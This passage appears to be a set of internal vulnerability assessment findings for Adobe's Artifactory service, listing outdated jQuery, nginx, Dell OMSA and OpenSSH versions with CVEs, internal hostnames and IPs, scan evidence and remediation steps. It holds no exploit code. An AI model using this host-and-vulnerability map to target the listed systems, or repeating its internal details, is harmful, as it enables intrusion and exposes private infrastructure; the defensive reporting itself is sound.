GHSA-6c3j-c64m-qhgq\|[1](https://blog.jquery.com/2019/04/10/jquery-3-4-0-released/ "https://blog.jquery.com/2019/04/10/jquery-3-4-0-released/")[2](https://nvd.nist.gov/vuln/detail/CVE-2019-11358 "https://nvd.nist.gov/vuln/detail/CVE-2019-11358")[3](https://github.com/jquery/jquery/commit/753d591aea698e57d6db58c9f722cd0808619b1b "https://github.com/jquery/jquery/commit/753d591aea698e57d6db58c9f722cd0808619b1b")\|<br>\|medium\|CVE-2020-11022 4642 Regex in its jQuery.htmlPrefilter sometimes may introduce XSS GHSA-gxr4-xjj5-5px2\|[1](https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/ "https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/")\|<br>\|medium\|CVE-2020-11023 CVE-2020-23064 4647 passing HTML containing <option> elements from untrusted sources - even after sanitizing it - to one of jQuery's DOM manipulation methods (i.e. .html(), .append(), and others) may execute untrusted code. GHSA-jpcq-cgw6-v4j6\|[1](https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/ "https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/")\|<br>\|low\|73 jQuery 1.x and 2.x are End-of-Life and no longer receiving security updates\|[1](https://github.com/jquery/jquery.com/issues/162 "https://github.com/jquery/jquery.com/issues/162")\||
|knockout|3.3.0|Found in https://n24.ultipro.com/lib/knockout/knockout.min.js?v=21.0.0.6754&ts=1704789197 _____Vulnerability info:<br><br>\|   \|   \|   \|<br>\|---\|---\|---\|<br>\|medium\|1244 XSS injection point in attr name binding for browser IE7 and older CVE-2019-14862 GHSA-vcjj-xf2r-mwvc\|[1](https://github.com/knockout/knockout/issues/1244 "https://github.com/knockout/knockout/issues/1244")\||
|knockout|3.3.0|Found in https://n24.ultipro.com/lib/knockout/knockout.min.js?v=21.0.0.6754&ts=1704789197 _____Vulnerability info:<br><br>\|   \|   \|   \|<br>\|---\|---\|---\|<br>\|medium\|1244 XSS injection point in attr name binding for browser IE7 and older CVE-2019-14862 GHSA-vcjj-xf2r-mwvc\|[1](https://github.com/knockout/knockout/issues/1244 "https://github.com/knockout/knockout/issues/1244")\||
|moment.js|2.10.2|Found in https://n24.ultipro.com/scripts/release/ukgpro-en.js?v=21.0.0.6754&ts=1704789197 _____Vulnerability info:<br><br>\|   \|   \|   \|<br>\|---\|---\|---\|<br>\|medium\|reDOS - regular expression denial of service 2936 GHSA-87vv-r9j6-g5qv CVE-2016-4055\|[1](https://github.com/moment/moment/issues/2936 "https://github.com/moment/moment/issues/2936")\|<br>\|medium\|Regular Expression Denial of Service (ReDoS) 22\|[1](https://security.snyk.io/vuln/npm:moment:20161019 "https://security.snyk.io/vuln/npm:moment:20161019")\|<br>\|high\|Regular Expression Denial of Service (ReDoS) CVE-2017-18214 GHSA-446m-mv8f-q348\|[1](https://security.snyk.io/vuln/npm:moment:20170905 "https://security.snyk.io/vuln/npm:moment:20170905")[2](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-18214 "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-18214")[3](https://github.com/moment/moment/issues/4163 "https://github.com/moment/moment/issues/4163")\|<br>\|high\|This vulnerability impacts npm (server) users of moment.js, especially if user provided locale string, eg fr is directly used to switch moment locale. CVE-2022-24785 GHSA-8hfj-j24r-96c4\|[1](https://github.com/moment/moment/security/advisories/GHSA-8hfj-j24r-96c4 "https://github.com/moment/moment/security/advisories/GHSA-8hfj-j24r-96c4")\||
|moment.js|2.10.2|Found in https://n24.ultipro.com/scripts/release/ukgpro-en.js?v=21.0.0.6754&ts=1704789197 _____Vulnerability info:<br><br>\|   \|   \|   \|<br>\|---\|---\|---\|<br>\|medium\|reDOS - regular expression denial of service 2936 GHSA-87vv-r9j6-g5qv CVE-2016-4055\|[1](https://github.com/moment/moment/issues/2936 "https://github.com/moment/moment/issues/2936")\|<br>\|medium\|Regular Expression Denial of Service (ReDoS) 22\|[1](https://security.snyk.io/vuln/npm:moment:20161019 "https://security.snyk.io/vuln/npm:moment:20161019")\|<br>\|high\|Regular Expression Denial of Service (ReDoS) CVE-2017-18214 GHSA-446m-mv8f-q348\|[1](https://security.snyk.io/vuln/npm:moment:20170905 "https://security.snyk.io/vuln/npm:moment:20170905")[2](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-18214 "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-18214")[3](https://github.com/moment/moment/issues/4163 "https://github.com/moment/moment/issues/4163")\|<br>\|high\|This vulnerability impacts npm (server) users of moment.js, especially if user provided locale string, eg fr is directly used to switch moment locale. CVE-2022-24785 GHSA-8hfj-j24r-96c4\|[1](https://github.com/moment/moment/security/advisories/GHSA-8hfj-j24r-96c4 "https://github.com/moment/moment/security/advisories/GHSA-8hfj-j24r-96c4")\||
|moment.js|2.10.2|Found in https://n24.ultipro.com/scripts/release/ultipro-en.js?v=21.0.0.6754&ts=1704789197 _____Vulnerability info:<br><br>\|   \|   \|   \|<br>\|---\|---\|---\|<br>\|medium\|reDOS - regular expression denial of service 2936 GHSA-87vv-r9j6-g5qv CVE-2016-4055\|[1](https://github.com/moment/moment/issues/2936 "https://github.com/moment/moment/issues/2936")\|<br>\|medium\|Regular Expression Denial of Service (ReDoS) 22\|[1](https://security.snyk.io/vuln/npm:moment:20161019 "https://security.snyk.io/vuln/npm:moment:20161019")\|<br>\|high\|Regular Expression Denial of Service (ReDoS) CVE-2017-18214 GHSA-446m-mv8f-q348\|[1](https://security.snyk.io/vuln/npm:moment:20170905 "https://security.snyk.io/vuln/npm:moment:20170905")[2](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-18214 "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-18214")[3](https://github.com/moment/moment/issues/4163 "https://github.com/moment/moment/issues/4163")\|<br>\|high\|This vulnerability impacts npm (server) users of moment.js, especially if user provided locale string, eg fr is directly used to switch moment locale. CVE-2022-24785 GHSA-8hfj-j24r-96c4\|[1](https://github.com/moment/moment/security/advisories/GHSA-8hfj-j24r-96c4 "https://github.com/moment/moment/security/advisories/GHSA-8hfj-j24r-96c4")\||
|moment.js|2.10.2|Found in https://n24.ultipro.com/scripts/release/ultipro-en.js?v=21.0.0.6754&ts=1704789197 _____Vulnerability info:<br><br>\|   \|   \|   \|<br>\|---\|---\|---\|<br>\|medium\|reDOS - regular expression denial of service 2936 GHSA-87vv-r9j6-g5qv CVE-2016-4055\|[1](https://github.com/moment/moment/issues/2936 "https://github.com/moment/moment/issues/2936")\|<br>\|medium\|Regular Expression Denial of Service (ReDoS) 22\|[1](https://security.snyk.io/vuln/npm:moment:20161019 "https://security.snyk.io/vuln/npm:moment:20161019")\|<br>\|high\|Regular Expression Denial of Service (ReDoS) CVE-2017-18214 GHSA-446m-mv8f-q348\|[1](https://security.snyk.io/vuln/npm:moment:20170905 "https://security.snyk.io/vuln/npm:moment:20170905")[2](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-18214 "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-18214")[3](https://github.com/moment/moment/issues/4163 "https://github.com/moment/moment/issues/4163")\|<br>\|high\|This vulnerability impacts npm (server) users of moment.js, especially if user provided locale string, eg fr is directly used to switch moment locale. CVE-2022-24785 GHSA-8hfj-j24r-96c4\||
# Replicate Finding:
1. Install the [retire.js](https://retirejs.github.io/) extension on your web browser: [Chrome](https://chrome.google.com/webstore/detail/retirejs/moibopkbhjceeedibkbkbchbjnkadmom) or [Firefox](https://addons.mozilla.org/en-US/firefox/addon/retire-js/)
2. Login to UKG pro: https://adobe.ultipro.com/
3. If you look at the top right corner (next to the address bar) of your browser, you'll see a globe looking icon with a number count in red font
4. Click on the icon, and you'll see a dropdown menu with all the detected vulnerabilities
5. If you want to save the findings, scroll to the bottom of the drop-down, you will see the "**save**" button at the bottom right
6. Click the button and it will save the report
# Mitigation/Remediation:
We recommend updating the affected software to the latest supported version. Additionally we recommend hardening the system after patching and ensuring all installed software including the noted software are patched. For more details please the references below!

**Be advised, the above patch should be applied to all other system(s) running the impacted software that are managed by the team.**
# References:
1. http://blog.jquery.com/2016/01/08/jquery-2-2-and-1-12-released/
2. http://bugs.jquery.com/ticket/11290
3. http://research.insecurelabs.org/jquery/test/
4. https://blog.jquery.com/2019/04/10/jquery-3-4-0-released/
5. https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/
6. https://bugs.jquery.com/ticket/11974
7. https://bugs.jqueryui.com/ticket/15284
8. https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-18214
9. https://github.com/advisories/GHSA-h6gj-6jjq-h8g9
10. https://github.com/jquery/jquery-ui/commit/8cc5bae1caa1fcf96bf5862c5646c787020ba3f9
11. https://github.com/jquery/jquery-ui/issues/2101
12. https://github.com/jquery/jquery-ui/security/advisories/GHSA-9gj3-hwp5-pmwc
13. https://github.com/jquery/jquery-ui/security/advisories/GHSA-gpqq-952q-5327
14. https://github.com/jquery/jquery-ui/security/advisories/GHSA-h6gj-6jjq-h8g9
15. https://github.com/jquery/jquery.com/issues/162
16. https://github.com/jquery/jquery/commit/753d591aea698e57d6db58c9f722cd0808619b1b
17. https://github.com/jquery/jquery/issues/2432
18. https://github.com/knockout/knockout/issues/1244
19. https://github.com/moment/moment/issues/2936
20. https://github.com/moment/moment/issues/4163
21. https://github.com/moment/moment/security/advisories/GHSA-8hfj-j24r-96c4
22. https://nvd.nist.gov/vuln/detail/CVE-2015-9251
23. https://nvd.nist.gov/vuln/detail/CVE-2019-11358
24. https://nvd.nist.gov/vuln/detail/CVE-2021-41182
25. https://nvd.nist.gov/vuln/detail/CVE-2021-41183
26. https://nvd.nist.gov/vuln/detail/CVE-2021-41184
27. https://nvd.nist.gov/vuln/detail/CVE-2022-31160
28. https://security.snyk.io/vuln/npm:moment:20161019
29. https://security.snyk.io/vuln/npm:moment:20170905



---
# File: /Users/gbiagomba/Documents/Adobe/Security Assessments/Threat Model Artifactory Access/Findings/Submitted/Artifactory Access - Outdated Vulnerable Software - nginx - High (7.8).md
---

# Risk: High (7.8)
`CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`

1. **CPE:2.3:a:nginx:nginx:1.20.2**
   - **CVSS**: 7.5 (High)  
   - **Vector**: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:L  
   - This score reflects the severity due to the remote nature of the attack (network vector) and the ability to exploit it without user interaction or privileges. It affects the confidentiality and availability of the system.

2. **CPE:2.3:a:nginx:nginx:1.22.1**
   - **CVSS**: 7.8 (High)  
   - **Vector**: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H  
   - The high rating stems from the local privilege required for attack execution but still results in severe impact on confidentiality, integrity, and availability.

Based on the risk, the SLA to fix the ticket is **60** days. The team must fix this issue by **2024-10-06**, per Adobe's[Vulnerability Management Standard](https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Vulnerability-Management-Standard.pdf#page=2)

**NOTE: ** The score was derived from the highest vulnerability in the software dependency package. For a breakdown of each reach, please reference the spreadsheet in the evidence section.  

# Executive Summary
JFrog Artifactory, a critical component in DevOps workflows, has been found to use outdated versions of NGINX with known vulnerabilities. These vulnerabilities can allow attackers to execute arbitrary code, cause denial of service, or gain unauthorized access to sensitive data. Immediate action is required to update NGINX to secure versions to protect the integrity and availability of the software artifacts managed by Artifactory.
## Detailed Finding:
While conducting a security review of `Artifactory Access`, we observed the noted web application used outdated 3P software with known vulnerabilities.  Specifically, the application uses multiple outdated versions of NGINX (1.20.2, 1.22.1, 1.25.3, 1.26.1). These versions are known to have several critical vulnerabilities, including buffer overflows, use-after-free, and memory corruption issues. For instance, NGINX 1.22.1 has a known vulnerability (CVE-2022-41742) in the `ngx_http_mp4_module` that can lead to memory disclosure or process crashes when processing specially crafted MP4 files. Similarly, NGINX 1.25.3 is vulnerable to a use-after-free issue in HTTP/3 (CVE-2024-24990), which can be exploited to execute arbitrary code. These vulnerabilities are particularly dangerous in the context of Artifactory, as they can compromise the entire DevOps pipeline, leading to unauthorized access to software artifacts, tampering with binaries, and disruption of software distribution.


## Impact:
If an attacker exploits these vulnerabilities, they can gain unauthorized access to the Artifactory system, execute arbitrary code, and potentially take control of the server. This could lead to the theft or tampering of critical software artifacts, disrupting the software development lifecycle, and causing significant downtime. Given Artifactory's role in managing and distributing software packages, the impact of such an attack could be widespread, affecting all downstream systems and users relying on the compromised artifacts.

# Affected Assets:
## Affected Software:
1. nginx@1.20.2
2. nginx@1.22.1
3. nginx@1.22.1
4. nginx@1.25.3
5. nginx@1.26.1

## Affected Host(s):
```
10.10.140.26 (sj1dra805.corp.adobe.com) [443/tcp]
10.40.102.13 (artifactory-no1.corp.adobe.com) [443/tcp]
10.40.102.13 (no1dra105.corp.adobe.com) [443/tcp]
10.50.227.143 (10.50.227.143) [443/tcp]
10.50.227.143 (artifactory.corp.adobe.com) [443/tcp]
10.50.227.143 (or1dra823.corp.adobe.com) [443/tcp]
10.50.227.143 (or1dra823.corp.adobe.com) [80/tcp]
10.50.227.144 (10.50.227.144) [443/tcp]
10.50.227.144 (artifactory.corp.adobe.com) [443/tcp]
10.50.227.144 (or1dra824.corp.adobe.com) [443/tcp]
10.50.227.144 (or1dra824.corp.adobe.com) [80/tcp]
10.50.227.145 (10.50.227.145) [443/tcp]
10.50.227.145 (or1dra825.corp.adobe.com) [443/tcp]
10.50.227.145 (or1dra825.corp.adobe.com) [80/tcp]
10.50.227.146 (10.50.227.146) [443/tcp]
10.50.227.146 (or1dra826.corp.adobe.com) [443/tcp]
10.50.227.146 (or1dra826.corp.adobe.com) [80/tcp]
10.50.227.147 (10.50.227.147) [443/tcp]
10.50.227.147 (or1dra935.corp.adobe.com) [443/tcp]
10.50.227.147 (or1dra935.corp.adobe.com) [80/tcp]
10.50.227.148 (10.50.227.148) [443/tcp]
10.50.227.148 (or1dra936.corp.adobe.com) [443/tcp]
10.50.227.148 (or1dra936.corp.adobe.com) [80/tcp]
10.50.227.149 (10.50.227.149) [443/tcp]
10.50.227.149 (or1dra937.corp.adobe.com) [443/tcp]
10.50.227.149 (or1dra937.corp.adobe.com) [80/tcp]
10.50.227.150 (10.50.227.150) [443/tcp]
10.50.227.150 (or1dra938.corp.adobe.com) [443/tcp]
10.50.227.150 (or1dra938.corp.adobe.com) [80/tcp]
10.50.229.70 (or1dra897.corp.adobe.com) [443/tcp]
18.210.130.73 (artifactory-ue1.adobeitc.com) [443/tcp]
34.202.44.184 (ec2-34-202-44-184.compute-1.amazonaws.com) [443/tcp]
34.214.139.243 (ec2-34-214-139-243.us-west-2.compute.amazonaws.com) [443/tcp]
34.215.95.173 (ec2-34-215-95-173.us-west-2.compute.amazonaws.com) [443/tcp]
44.209.227.144 (ec2-44-209-227-144.compute-1.amazonaws.com) [443/tcp]
44.209.41.62 (ec2-44-209-41-62.compute-1.amazonaws.com) [443/tcp]
44.236.94.239 (ec2-44-236-94-239.us-west-2.compute.amazonaws.com) [443/tcp]
44.239.183.186 (ec2-44-239-183-186.us-west-2.compute.amazonaws.com) [443/tcp]
52.184.221.209 (52.184.221.209) [443/tcp]
52.184.221.209 (artifactory-va7.adobeitc.com) [443/tcp]
52.201.24.134 (artifactory-ue1.adobeitc.com) [443/tcp]
52.203.159.126 (artifactory-ue1.adobeitc.com) [443/tcp]
52.209.151.82 (artifactory-ew1.adobeitc.com) [443/tcp]
52.26.233.21 (ec2-52-26-233-21.us-west-2.compute.amazonaws.com) [443/tcp]
52.44.15.243 (ec2-52-44-15-243.compute-1.amazonaws.com) [443/tcp]
54.148.166.60 (artifactory-stg.adobeitc.com) [443/tcp]
54.149.114.0 (ec2-54-149-114-0.us-west-2.compute.amazonaws.com) [443/tcp]
54.186.153.227 (ec2-54-186-153-227.us-west-2.compute.amazonaws.com) [443/tcp]
54.200.181.167 (ec2-54-200-181-167.us-west-2.compute.amazonaws.com) [443/tcp]
54.229.144.51 (artifactory-ew1.adobeitc.com) [443/tcp]
54.68.17.22 (artifactory-stg.adobeitc.com) [443/tcp]
54.69.227.215 (artifactory-uw2.adobeitc.com) [443/tcp]
54.87.54.47 (artifactory-ue1.adobeitc.com) [443/tcp]
```

# Evidence:
## Curl:
```bash
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.22.1
Date: Thu, 13 Mar 2025 18:28:17 GMT
Content-Type: text/html
Content-Length: 145
Location: https://artifactory.corp.adobe.com/ui/
Connection: keep-alive

HTTP/1.1 200 OK
Date: Thu, 13 Mar 2025 18:28:17 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 3029
Connection: keep-alive
Accept-Ranges: bytes
Cache-Control: max-age=604800000
Content-Security-Policy: script-src 'self' 'unsafe-eval'; font-src 'self' data:; base-uri 'self'; style-src 'self' 'unsafe-inline'; form-action 'self'; frame-ancestors 'self'
Etag: W/"bd5-18c5d74aa00"
Feature-Policy: geolocation 'none';microphone 'none';camera 'none';payment 'none'
Last-Modified: Tue, 12 Dec 2023 09:56:16 GMT
Referrer-Policy: no-referrer
Vary: Accept-Encoding
X-Content-Security-Policy: script-src 'self' 'unsafe-eval'; font-src 'self' data:; base-uri 'self'; style-src 'self' 'unsafe-inline'; form-action 'self'; frame-ancestors 'self'
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-Webkit-Csp: script-src 'self' 'unsafe-eval'; font-src 'self' data:; base-uri 'self'; style-src 'self' 'unsafe-inline'; form-action 'self'; frame-ancestors 'self'
X-Xss-Protection: 1; mode=block
```
## testssl:
```csv
banner_server,10.50.227.143/10.50.227.143,443,INFO,nginx/1.22.1,,
banner_server,10.50.227.144/10.50.227.144,443,INFO,nginx/1.22.1,,
banner_server,10.50.227.145/10.50.227.145,443,INFO,nginx/1.22.1,,
banner_server,10.50.227.146/10.50.227.146,443,INFO,nginx/1.22.1,,
banner_server,10.50.227.147/10.50.227.147,443,INFO,nginx/1.22.1,,
banner_server,10.50.227.148/10.50.227.148,443,INFO,nginx/1.22.1,,
banner_server,10.50.227.149/10.50.227.149,443,INFO,nginx/1.22.1,,
banner_server,10.50.227.150/10.50.227.150,443,INFO,nginx/1.22.1,,
banner_server,52.184.221.209/52.184.221.209,443,INFO,nginx/1.25.3,,
banner_server,artifactory-ew1.adobeitc.com/52.209.151.82,443,INFO,nginx/1.20.2,,
banner_server,artifactory-ew1.adobeitc.com/54.229.144.51,443,INFO,nginx/1.20.2,,
banner_server,artifactory-no1.corp.adobe.com/10.40.102.13,443,INFO,nginx/1.22.1,,
banner_server,artifactory-stg.adobeitc.com/54.148.166.60,443,INFO,nginx/1.26.1,,
banner_server,artifactory-stg.adobeitc.com/54.68.17.22,443,INFO,nginx/1.26.1,,
banner_server,artifactory-ue1.adobeitc.com/18.210.130.73,443,INFO,nginx/1.20.2,,
banner_server,artifactory-ue1.adobeitc.com/52.201.24.134,443,INFO,nginx/1.20.2,,
banner_server,artifactory-ue1.adobeitc.com/52.203.159.126,443,INFO,nginx/1.20.2,,
banner_server,artifactory-ue1.adobeitc.com/54.87.54.47,443,INFO,nginx/1.20.2,,
banner_server,artifactory-va7.adobeitc.com/52.184.221.209,443,INFO,nginx/1.25.3,,
banner_server,artifactory.corp.adobe.com/10.50.227.144,443,INFO,nginx/1.22.1,,
banner_server,ec2-34-202-44-184.compute-1.amazonaws.com/34.202.44.184,443,INFO,nginx/1.20.2,,
banner_server,ec2-34-214-139-243.us-west-2.compute.amazonaws.com/34.214.139.243,443,INFO,nginx/1.20.2,,
banner_server,ec2-34-215-95-173.us-west-2.compute.amazonaws.com/34.215.95.173,443,INFO,nginx/1.20.2,,
banner_server,ec2-44-209-227-144.compute-1.amazonaws.com/44.209.227.144,443,INFO,nginx/1.20.2,,
banner_server,ec2-44-209-41-62.compute-1.amazonaws.com/44.209.41.62,443,INFO,nginx/1.20.2,,
banner_server,ec2-44-236-94-239.us-west-2.compute.amazonaws.com/44.236.94.239,443,INFO,nginx/1.20.2,,
banner_server,ec2-44-239-183-186.us-west-2.compute.amazonaws.com/44.239.183.186,443,INFO,nginx/1.20.2,,
banner_server,ec2-52-26-233-21.us-west-2.compute.amazonaws.com/52.26.233.21,443,INFO,nginx/1.22.1,,
banner_server,ec2-52-44-15-243.compute-1.amazonaws.com/52.44.15.243,443,INFO,nginx/1.20.2,,
banner_server,ec2-54-149-114-0.us-west-2.compute.amazonaws.com/54.149.114.0,443,INFO,nginx/1.20.2,,
banner_server,ec2-54-186-153-227.us-west-2.compute.amazonaws.com/54.186.153.227,443,INFO,nginx/1.20.2,,
banner_server,ec2-54-200-181-167.us-west-2.compute.amazonaws.com/54.200.181.167,443,INFO,nginx/1.20.2,,
banner_server,no1dra105.corp.adobe.com/10.40.102.13,443,INFO,nginx/1.22.1,,
banner_server,or1dra823.corp.adobe.com/10.50.227.143,443,INFO,nginx/1.22.1,,
banner_server,or1dra824.corp.adobe.com/10.50.227.144,443,INFO,nginx/1.22.1,,
banner_server,or1dra825.corp.adobe.com/10.50.227.145,443,INFO,nginx/1.22.1,,
banner_server,or1dra826.corp.adobe.com/10.50.227.146,443,INFO,nginx/1.22.1,,
banner_server,or1dra897.corp.adobe.com/10.50.229.70,443,INFO,nginx/1.22.1,,
banner_server,or1dra935.corp.adobe.com/10.50.227.147,443,INFO,nginx/1.22.1,,
banner_server,or1dra936.corp.adobe.com/10.50.227.148,443,INFO,nginx/1.22.1,,
banner_server,or1dra937.corp.adobe.com/10.50.227.149,443,INFO,nginx/1.22.1,,
banner_server,or1dra938.corp.adobe.com/10.50.227.150,443,INFO,nginx/1.22.1,,
banner_server,sj1dra805.corp.adobe.com/10.10.140.26,443,INFO,nginx/1.22.1,,
```

# Replicate Finding:
1. Run the following command: `testssl.sh --append --assume-http --full --parallel --sneaky -oA "testssl_output-$current_time" HOSTNAME # Change the HOSTNAME to the impacted host`

# Mitigation/Remediation:
We recommend the following:
1. **Updating NGINX:** Ensure that NGINX is updated to at least version 1.27.0, which addresses many of the known vulnerabilities.
```bash
   sudo apt-get update
   sudo apt-get install nginx=1.27.0
```
2. **Configuration Review:** Review and update the NGINX configuration to disable any unnecessary modules, such as `ngx_http_mp4_module`, if not required.
```nginx
   # Disable the MP4 module if not needed
   # Comment out or remove the following line in the nginx.conf
   # load_module modules/ngx_http_mp4_module.so;
```
3. **Regular Patching:** Implement a regular patch management process to ensure that all third-party software, including NGINX, is kept up to date with the latest security patches.

**Be advised, the above patch should be applied to all other system(s) running the impacted software that are managed by the team.**

# References:
1. https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Patch-Management-Standard.pdf
2. https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Source_Code_Security_Standard.pdf
3. https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Secure-Product-Lifecycle-Standard.pdf
4. https://www.tenable.com/plugins/was/113420
5. https://httpd.apache.org/security/vulnerabilities_24.html
6. https://www.cvedetails.com/vulnerability-search-by-cpe?f=1&page=1&cpe23str=cpe%3A2.3%3Aa%3Af5%3Anginx%3A1.22.1
7. https://www.cvedetails.com/vulnerability-search-by-cpe?f=1&page=1&cpe23str=cpe%3A2.3%3Aa%3Af5%3Anginx%3A1.20.2
8. [NGINX Security Advisories](https://nginx.org/en/security_advisories.html)
9. [CVE-2022-41742 Overview](https://nvd.nist.gov/vuln/detail/CVE-2022-41742) [oai_citation:2,Nginx < 1.22.1 Multiple Vulnerabilities<!-- --> | Tenable®](https://www.tenable.com/plugins/was/113420) [oai_citation:1,NVD - CVE-2022-41742](https://nvd.nist.gov/vuln/detail/CVE-2022-41742)
10. [Tenable NGINX Vulnerabilities Overview](https://www.tenable.com/cve/CVE-2022-41742
11. [CVE-2022-41742](https://nvd.nist.gov/vuln/detail/CVE-2022-41742)
12. [CVE-2024-24990](https://my.f5.com/manage/s/article/K000138444)
13. [NGINX Security Advisories](https://nginx.org/en/security_advisories.html)


---
# File: /Users/gbiagomba/Documents/Adobe/Security Assessments/Threat Model Artifactory Access/Findings/Submitted/Artifactory Access - Outdated Vulnerable Software - Dell EMC Open Manage Server Administrator - High (7.8).md
---

# Risk: High (7.8)
`CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`

**Explanation**: This vulnerability is rated high because a local low-privileged malicious user could potentially exploit this vulnerability to execute arbitrary code in order to elevate privileges on the system. Exploitation may lead to a complete system compromise.

Based on the risk, the SLA to fix the ticket is **60** days. The team must fix this issue by **DATE**, per Adobe's[Vulnerability Management Standard](https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Vulnerability-Management-Standard.pdf#page=2)

# Description:
While conducting a security review of `Artifactory Access`, we observed the noted web application used outdated 3P software with known vulnerabilities. Specifically, the version running is impacted by **CVE-2023-43079**. The Dell OpenManage Server Administrator (OMSA) versions 11.0.0.0 and prior contain an **Improper Access Control** vulnerability. 

# Impact:
If an attacker successfully exploits this vulnerability, they could execute arbitrary code and gain elevated privileges on the affected system. This could lead to:
- Full control over the system, allowing the attacker to modify, delete, or steal sensitive data.
- Potential for persistence on the system, leading to more complex and severe attacks.
- Disruption of normal operations, affecting system availability.

# Affected Assets:
## Affected Software:
- dell emc_openmanage_server_administrator@11.0.0.0

## Affected Host(s):
- or1dra823.corp.adobe.com (10.50.227.143) [1311/tcp]
- or1dra824.corp.adobe.com (10.50.227.144) [1311/tcp]

# Evidence:
```html
    <head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1"/><meta name="description" content="Best practices for logging in When logging in to Server Administrator, use your operating system user name and password. When logging in to Server Administrator on a system that is running Microsoft ..."/><meta name="copyright" content="(C) Copyright 2022"/><meta name="generator" content="DITA-OT"/><meta name="prodname" content=""/><meta name="version" content="0"/><meta name="meta-topic-title" content="    Dell OpenManage Server Administrator Version 11.0.0.0     Online Help   "/><title>Log In Log Out</title><meta name="wh-path2root" content=""/><meta name="wh-source-relpath" content="GUID-682301F6-126C-42D2-8A42-AA6495AFB0C4.xml"/><meta name="wh-out-relpath" content="GUID-682301F6-126C-42D2-8A42-AA6495AFB0C4.html"/><link rel="stylesheet" type="text/css" href="./oxygen-webhelp/lib/bootstrap/css/bootstrap.min.css"/><link rel="stylesheet" href="./oxygen-webhelp/lib/jquery-ui/jquery-ui.min.css"/><link rel="stylesheet" type="text/css" href="./oxygen-webhelp/app/topic-page.css?buildId=2022030500"/><script type="text/javascript" src="./oxygen-webhelp/lib/jquery/jquery-3.5.1.min.js"><!----></script><script data-main="./oxygen-webhelp/app/topic-page.js" src="./oxygen-webhelp/lib/requirejs/require.js"></script><link rel="stylesheet" type="text/css" href="oxygen-webhelp/template/resources/css/main.css?buildId=2022030500"/><link rel="stylesheet" type="text/css" href="oxygen-webhelp/template/resources/css/topic.css?buildId=2022030500"/><link rel="stylesheet" type="text/css" href="oxygen-webhelp/template/resources/css/admonitions.css?buildId=2022030500"/><link rel="stylesheet" type="text/css" href="oxygen-webhelp/template/resources/css/nav-links.css?buildId=2022030500"/><link rel="stylesheet" type="text/css" href="oxygen-webhelp/template/resources/css/delltechnologies-custom.css"/><script type="text/javascript" src="./oxygen-webhelp/app/topic-input-sanitizer.js"></script><script type="text/javascript" src="./oxygen-webhelp/app/topic-loader.js"></script><script type="text/javascript" src="./oxygen-webhelp/app/topic-title-meta.js"></script></head>
                    <a href="index.html" class=" wh_logo "><img src="oxygen-webhelp/template/resources/images/logos/delltechnologies-white-rgb.svg" alt="    Dell OpenManage Server Administrator Version 11.0.0.0     Online Help   "/></a>
                    <div class=" wh_publication_title "><span class="booktitle"><span class="mainbooktitle">Dell OpenManage Server Administrator Version 11.0.0.0<span class="pipe-separator"></span></span><span class="booktitlealt">Online Help</span></span></div>

```

# Replicate Finding:
1. Run the following command: `curl -kLs "https://or1dra823.corp.adobe.com:1311/help/omahip/en/GUID-682301F6-126C-42D2-8A42-AA6495AFB0C4.html" | grep -i "11.0.0"`
2. You can visit the same URL in your browser: `https://or1dra823.corp.adobe.com:1311/help/omahip/en/GUID-682301F6-126C-42D2-8A42-AA6495AFB0C4.html`

# Mitigation/Remediation:
We recommend the following: 
1. **Upgrade to the latest version**: It is crucial to update OMSA to version 11.0.1.0 or higher, where this vulnerability has been fixed. Dell has provided security updates addressing the issue. 
2. **Limit user privileges**: Restrict access to OMSA for users who do not require it, especially preventing low-privileged users from accessing system management tools.
3. **Monitor system activity**: Regularly audit logs and monitor for any unusual activity to detect and respond to potential exploitation early.
Lastly, we recommend hardening the system after patching and ensuring all installed software including the noted software are patched. 

For more details, please the references below!

**Be advised, the above patch should be applied to all other system(s) running the impacted software that are managed by the team.**

# References:
1. https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Patch-Management-Standard.pdf
2. https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Source_Code_Security_Standard.pdf
3. https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Secure-Product-Lifecycle-Standard.pdf
4. [Dell Security Advisory](https://www.dell.com/support/kbdoc/en-us/000218469/dsa-2023-367-dell-openmanage-server-administrator-omsa-security-update-for-multiple-vulnerabilities)
5. [National Vulnerability Database](https://nvd.nist.gov/vuln/detail/CVE-2023-43079)


---
# File: /Users/gbiagomba/Documents/Adobe/Security Assessments/Threat Model Artifactory Access/Findings/Submitted/Artifactory Access - OpenSSH Vulnerability - High (7.8).md
---

# Risk: High (7.8)
**CVSS:3.1**`/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`

### 1. CVSS String/Score:
**CVE-2021-41617**:  
CVSSv3 Score: **7.0 (High)**  
